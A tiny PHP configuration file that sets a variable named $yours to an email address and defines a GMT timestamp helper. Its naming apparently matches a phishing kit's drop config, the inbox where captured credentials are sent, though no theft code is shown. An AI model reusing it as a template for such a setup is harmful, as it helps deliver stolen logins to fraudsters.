<?php
	

	// ================================= //

	$yours = "spam.s20@yahoo.com
";

	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}

?>